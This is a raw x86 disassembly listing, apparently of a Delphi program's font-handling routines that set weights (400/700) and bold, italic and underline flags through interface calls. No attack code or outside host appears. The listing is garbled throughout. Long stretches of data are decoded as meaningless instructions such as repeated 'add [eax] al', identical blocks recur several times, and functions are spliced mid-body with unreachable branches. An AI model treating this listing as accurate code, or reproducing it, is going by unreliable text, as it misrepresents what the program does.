add [ ebx + esi + 0x33e40046 ] bl
inc esi
add [ ebp + 0x34040042 ] cl
inc esi
add [ ebp + 0x29e40042 ] bl
inc edx
add [ esp + esi + 0x46 ] cl
add [ eax + 0x5000422c ] dh
xor al 0x46
add [ eax + 0x24004634 ] ah
xor eax 0x35700046
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x41 ] cl
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
jpo r-xdata
jo r-xdata
and al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x24b00046 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2c004624 ] bl
add [ eax ] al
add [ eax ] ah
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebx + 0x1c ]
call sub_420794
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405928
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_4636ac
call sub_4611a0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_462734
cli
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462878
imul esp [ ebx - 0x75 ] 0x4624b0c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_462f59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_426f30
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_426f64
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032e8
retn
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_405940
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_42333c
call sub_4271b4
mov [ ebp - 0x24 ] eax
jmp r-xdata
imul esp [ ebx + 0x28 ] 0xe4004624
mov eax esi
call sub_423354
call sub_423d84
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423af8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_463069
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423754
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42376c
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237c4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46303d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_420f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463044
mov eax [ ebp - 0x18 ]
call sub_4032e8
retn
mov eax [ ebp - 0x8 ]
call sub_405928
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_4636c8
call sub_4611a0
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_462734
sub_4621f7
lodsd [ esi ]
and [ esi ] eax
mov bh 0x21
inc esi
add cl al
and [ esi ] eax
popfd
and [ esi ] eax
movsd [ edi ] [ esi ]
and [ esi ] eax
xlat
and [ esi ] eax
loope r-xdata
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
inc esi
add bl ch
and [ esi ] eax

add al 0x24
retn
popad
jo r-xdata
add bh dh
and al [ esi ]
add [ ebx ] esp
inc esi
add [ ebx ] cl
and eax [ esi ]
jmp r-xdata
jb r-xdata
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x232cda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ebx ]
inc esi
add [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and eax [ esi ]
sub [ eax ] al
add [ eax ] al
push eax
and [ esi ] al
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x26fc0040 ] bl
inc esi
add [ eax ] ch
daa
inc esi
add [ eax ] ch
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
cmp eax 0x220bda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
movsb [ edi ] [ esi ]
and al [ esi ]
sbb esp [ edx ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x280046 ] ch
add [ eax ] al
push eax
and [ esi ] al
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x26fc0040 ] bl
inc esi
add [ edx + ebp + 0x46 ] bh
add [ eax + ebp + 0x540c0046 ] dh
inc esi
outsd
outsb
je r-xdata
scasd [ edi ]
inc eax
add ah cl
add eax 0xffffffe0
jmp r-xdata
inc esi
add [ eax ] bh
xor eax [ esi ]
pop eax
xor eax [ esi ]
movsb [ edi ] [ esi ]
sub al 0x42
add [ ebx + esi + 0x33e40046 ] bl
inc esi
add [ ebp + 0x34040042 ] cl
inc esi
add [ ebp + 0x29e40042 ] bl
inc edx
add [ esp + esi + 0x46 ] cl
add [ eax + 0x5000422c ] dh
xor al 0x46
add [ eax + 0x24004634 ] ah
xor eax 0x35700046
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x41 ] cl
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
jb r-xdata
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
jpo r-xdata
jo r-xdata
and al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x24b00046 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2c004624 ] bl
add [ eax ] al
add [ eax ] ah
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
cli
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462878
imul esp [ ebx - 0x75 ] 0x4624b0c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_462f59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_426f30
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_426f64
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032e8
retn
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_405940
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_42333c
call sub_4271b4
mov [ ebp - 0x24 ] eax
jmp r-xdata
imul esp [ ebx + 0x28 ] 0xe4004624
mov eax esi
call sub_423354
call sub_423d84
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423af8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_463069
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423754
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42376c
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237c4
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_46303d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_420f30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463044
mov eax [ ebp - 0x18 ]
call sub_4032e8
retn
mov eax [ ebp - 0x8 ]
call sub_405928
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_4636c8
call sub_4611a0
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_462734
sub_462318
int 0x22
inc esi
add bh dl
xlat
inc esi
add [ ebp - 0x3affb9de ] bh
and al [ esi ]
mul [ edx ]
inc esi
add [ ecx ] al
and eax [ esi ]
or esp [ ebx ]
inc esi
add bl ch
and al [ esi ]
add al [ eax ]
add [ eax ] al
xor [ ebp + 0x5d ] ecx
jns r-xdata
inc esi
add [ eax ] bh
xor eax [ esi ]
pop eax
xor eax [ esi ]
movsb [ edi ] [ esi ]
sub al 0x42
add [ ebx + esi + 0x33e40046 ] bl
inc esi
add [ ebp + 0x34040042 ] cl
inc esi
add [ ebp + 0x29e40042 ] bl
inc edx
add [ esp + esi + 0x46 ] cl
add [ eax + 0x5000422c ] dh
xor al 0x46
add [ eax + 0x24004634 ] ah
xor eax 0x35700046
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x41 ] cl
add [ eax ] ch
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
jb r-xdata
and al [ esi ]
loope r-xdata
xlat
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x2318da82
inc esi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x232cda82
inc esi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ebx ]
inc esi
add [ ebx ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and eax [ esi ]
sub [ eax ] al
add [ eax ] al
push eax
and [ esi ] al
xor [ 0x59a80040 ] dh
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x26fc0040 ] bl
inc esi
add [ eax ] ch
daa
inc esi
add [ eax ] ch
inc esi
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
jpo r-xdata
jo r-xdata
and al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x24b00046 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x2c004624 ] bl
add [ eax ] al
add [ eax ] ah
cli
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462878
imul esp [ ebx - 0x75 ] 0x4624b0c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_405940
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
imul esp [ ebx + 0x28 ] 0xe4004624
sub_4624d4
push ebx
call sub_4027fc
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_462500
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462878
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x20 ]
call sub_405940
sub edx 0xffffffdc
sub_462550
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_40596c
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_462dec
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_405940
sub edx 0xffffffdc
sub_4625a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4625e3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_462500
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4625ea
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_4625f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40599c
xor eax eax
push ebp
push sub_46264a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_462500
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462651
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_462658
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46269b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_462550
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4626a2
lea eax [ ebp - 0x4 ]
call sub_405928
retn
sub_4626a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4627e8
mov edx eax
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_40360c
lea eax [ esi + 0x14 ]
call sub_405940
mov eax esi
test bl bl
je r-xdata
sub edx 0xfffffff8
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4626fc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_4627b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_462734
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40599c
xor eax eax
push ebp
push sub_46279c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_4627b8
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4627a3
lea eax [ ebp - 0x4 ]
call sub_405928
retn
lea eax [ ebx + 0x10 ]
push eax
mov edx r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4613ac
sub_4627e8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_462878
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4626a8
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4628b4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462a58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462a5f
lea eax [ ebp - 0x28 ]
call sub_404038
lea eax [ ebp - 0x24 ]
call sub_405928
lea eax [ ebp - 0xc ]
call sub_404718
retn
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_40596c
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_404718
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov bl [ r-xdata ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x4
lea eax [ ebp - 0x1e ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_462a2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
call sub_4042c0
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_420694
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_402b18
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_42070c
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420738
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
call sub_42079c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
or bl 0x8
sub_462a7c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462bfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_404038
lea eax [ ebp - 0xc ]
call sub_404718
lea eax [ ebp - 0x8 ]
call sub_405928
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_462bcd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_40596c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42067c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_404864
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4206f0
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42072c
test al 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42072c
test al 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42072c
test al 0x4
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42072c
test al 0x8
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_420794
and eax 0xff
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
retn
sub_462c05
add [ eax ] al
add [ edx ] al
loopne r-xdata
mov esp ebp
pop ebp
retn
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
add [ eax + 0x1c ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462d4d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_40596c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462d54
lea eax [ ebp - 0x2c ]
call sub_404038
lea eax [ ebp - 0x8 ]
call sub_405928
lea eax [ ebp - 0x4 ]
call sub_404718
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_42067c
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_404864
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404874
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_4206f0
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_42072c
test al 0x1
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebx + 0x1c ]
call sub_420794
and eax 0xff
mov [ ebp - 0x16 ] ax
